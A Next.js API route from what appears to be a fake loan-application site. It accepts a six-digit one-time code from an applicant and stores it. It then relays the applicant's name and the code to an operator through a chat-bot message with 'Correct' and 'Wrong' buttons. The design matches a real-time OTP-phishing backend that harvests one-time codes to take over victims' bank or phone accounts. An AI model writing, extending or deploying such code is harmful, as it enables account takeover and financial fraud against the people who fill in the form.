import { audit, findApplication, getSql, notifyAdmin, publicApp } from "../../../../../lib/applications";

export const runtime = "nodejs";

export async function POST(
  request: Request,
  context: { params: Promise<{ applicationId: string }> }
) {
  const { applicationId } = await context.params;

  const { value, referenceId } = (await request.json()) as {
    value: string;
    referenceId: string;
  };

  const row = await findApplication(applicationId);

  if (
    !row ||
    row.reference_id !== referenceId ||
    row.status !== "OTP_PENDING"
  ) {
    return Response.json(
      { error: "This OTP request is not valid." },
      { status: 400 }
    );
  }

  const otp = String(value || "").trim();

  if (!/^\d{6}$/.test(otp)) {
    return Response.json(
      { error: "Enter a 6-digit OTP." },
      { status: 400 }
    );
  }

  await getSql()`UPDATE loan_applications SET membership_id=${otp}, status='MEMBERSHIP_NUMBER_PENDING', updated_at=NOW() WHERE application_id=${applicationId}`;

  await audit(applicationId, "FIRST_OTP_SUBMITTED", "applicant", "user_submitted_value");

  await notifyAdmin(
    `FIRST OTP\n\n👤 Applicant: ${row.full_name}\n🔢 OTP: ${otp}\n\nConfirm this value.`,
    {
      inline_keyboard: [
        [{ text: "✅ Correct", callback_data: `confirm_first_otp:${applicationId}` }],
        [{ text: "❌ Wrong", callback_data: `wrong_first_otp:${applicationId}` }],
      ],
    }
  );

  return Response.json(
    publicApp({ ...row, status: "MEMBERSHIP_NUMBER_PENDING" })
  );
}